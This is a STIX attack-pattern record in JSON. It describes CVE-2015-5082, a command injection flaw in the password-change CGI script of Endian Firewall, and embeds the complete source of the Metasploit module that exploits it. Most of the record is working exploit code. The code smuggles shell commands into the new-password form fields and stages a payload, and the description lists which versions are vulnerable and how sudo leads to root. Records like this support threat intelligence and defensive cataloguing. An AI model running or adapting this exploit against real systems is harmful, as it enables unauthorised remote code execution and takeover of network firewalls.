{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--694f5a80-96f9-4716-b8ca-e9a8928d3012",
    "created": "2024-08-14T17:01:29.613964Z",
    "modified": "2024-08-14T17:01:29.613968Z",
    "name": "Endian Firewall Proxy Password Change Command Injection",
    "description": " This module exploits an OS command injection vulnerability in a web-accessible CGI script used to change passwords for locally-defined proxy user accounts. Valid credentials for such an account are required.  Command execution will be in the context of the \"nobody\" account, but this account had broad sudo permissions, including to run the script /usr/local/bin/chrootpasswd (which changes the password for the Linux root account on the system to the value specified by console input once it is executed).  The password for the proxy user account specified will *not* be changed by the use of this module, as long as the target system is vulnerable to the exploit.  Very early versions of Endian Firewall (e.g. 1.1 RC5) require HTTP basic auth credentials as well to exploit this vulnerability. Use the USERNAME and PASSWORD advanced options to specify these values if required.  Versions >= 3.0.0 still contain the vulnerable code, but it appears to never be executed due to a bug in the vulnerable CGI script which also prevents normal use (http://jira.endian.com/browse/UTM-1002).  Versions 2.3.x and 2.4.0 are not vulnerable because of a similar bug (http://bugs.endian.com/print_bug_page.php?bug_id=3083).  Tested successfully against the following versions of EFW Community:  1.1 RC5, 2.0, 2.1, 2.2, 2.5.1, 2.5.2.  Should function against any version from 1.1 RC5 to 2.2.x, as well as 2.4.1 and 2.5.x. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/efw_chpasswd_exec.rb",
            "external_id": "efw_chpasswd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-5082"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Endian Firewall Proxy Password Change Command Injection',\n      'Description' => %q{\n        This module exploits an OS command injection vulnerability in a\n        web-accessible CGI script used to change passwords for locally-defined\n        proxy user accounts. Valid credentials for such an account are\n        required.\n\n        Command execution will be in the context of the \"nobody\" account, but\n        this account had broad sudo permissions, including to run the script\n        /usr/local/bin/chrootpasswd (which changes the password for the Linux\n        root account on the system to the value specified by console input\n        once it is executed).\n\n        The password for the proxy user account specified will *not* be\n        changed by the use of this module, as long as the target system is\n        vulnerable to the exploit.\n\n        Very early versions of Endian Firewall (e.g. 1.1 RC5) require\n        HTTP basic auth credentials as well to exploit this vulnerability.\n        Use the USERNAME and PASSWORD advanced options to specify these values\n        if required.\n\n        Versions >= 3.0.0 still contain the vulnerable code, but it appears to\n        never be executed due to a bug in the vulnerable CGI script which also\n        prevents normal use (http://jira.endian.com/browse/UTM-1002).\n\n        Versions 2.3.x and 2.4.0 are not vulnerable because of a similar bug\n        (http://bugs.endian.com/print_bug_page.php?bug_id=3083).\n\n        Tested successfully against the following versions of EFW Community:\n\n        1.1 RC5, 2.0, 2.1, 2.2, 2.5.1, 2.5.2.\n\n        Should function against any version from 1.1 RC5 to 2.2.x, as well as\n        2.4.1 and 2.5.x.\n      },\n      'Author' => [\n        'Ben Lincoln' # Vulnerability discovery, exploit, Metasploit module\n      ],\n      'References' => [\n        ['CVE', '2015-5082'],\n        ['EDB', '37426'],\n        ['EDB', '37428']\n      ],\n      'Privileged'  => false,\n      'Platform'    => %w{ linux },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'DisableNops' => true,\n          'Space'       => 2048\n        },\n      'Targets'        =>\n        [\n          [ 'Linux x86',\n            {\n              'Platform'        => 'linux',\n              'Arch'            => ARCH_X86,\n              'CmdStagerFlavor' => [ :echo, :printf ]\n            }\n          ],\n          [ 'Linux x86_64',\n            {\n              'Platform'        => 'linux',\n              'Arch'            => ARCH_X64,\n              'CmdStagerFlavor' => [ :echo, :printf ]\n            }\n          ]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true,\n          'RPORT' => 10443\n        },\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2015-06-28',\n      'License' => MSF_LICENSE\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to chpasswd.cgi CGI script',\n        '/cgi-bin/chpasswd.cgi']),\n      OptString.new('EFW_USERNAME', [true,\n        'Valid proxy account username for the target system']),\n      OptString.new('EFW_PASSWORD', [true,\n        'Valid password for the proxy user account']),\n      OptString.new('RPATH', [true,\n        'Target PATH for binaries used by the CmdStager', '/bin'])\n     ])\n\n    register_advanced_options(\n      [\n        OptInt.new('HTTPClientTimeout', [ true, 'HTTP read response timeout (seconds)', 5])\n      ])\n\n  end\n\n  def exploit\n    execute_cmdstager(:linemax => 200, :nodelete => true)\n  end\n\n  def execute_command(cmd, opts)\n    cmd.gsub!('chmod', \"#{datastore['RPATH']}/chmod\")\n\n    req(cmd)\n  end\n\n  def req(cmd)\n    sploit = \"#{datastore['EFW_PASSWORD']}; #{cmd};\"\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('change', nil, nil, 'form-data; name=\"ACTION\"')\n    post_data.add_part(datastore['EFW_USERNAME'], nil, nil, 'form-data; name=\"USERNAME\"')\n    post_data.add_part(datastore['EFW_PASSWORD'], nil, nil, 'form-data; name=\"OLD_PASSWORD\"')\n    post_data.add_part(sploit, nil, nil, 'form-data; name=\"NEW_PASSWORD_1\"')\n    post_data.add_part(sploit, nil, nil, 'form-data; name=\"NEW_PASSWORD_2\"')\n    post_data.add_part('  Change password', nil, nil, 'form-data; name=\"SUBMIT\"')\n\n    data = post_data.to_s\n    boundary = post_data.bound\n\n    referer_url =\n      \"https://#{datastore['RHOST']}:#{datastore['RPORT']}\" +\n      \"#{datastore['TARGETURI']}\"\n\n\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => datastore['TARGETURI'],\n        'ctype' => \"multipart/form-data; boundary=#{boundary}\",\n        'headers' => {\n          'Referer' => referer_url\n        },\n        'data' => data\n      })\n\n     if res\n       if res.code == 401\n         fail_with(Failure::NoAccess,\n           \"#{rhost}:#{rport} - Received a 401 HTTP response - \" +\n           \"specify web admin credentials using the USERNAME \" +\n           \"and PASSWORD advanced options to target this host.\")\n       end\n       if res.code == 404\n         fail_with(Failure::Unreachable,\n           \"#{rhost}:#{rport} - Received a 404 HTTP response - \" +\n           \"your TARGETURI value is most likely not correct\")\n       end\n     end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}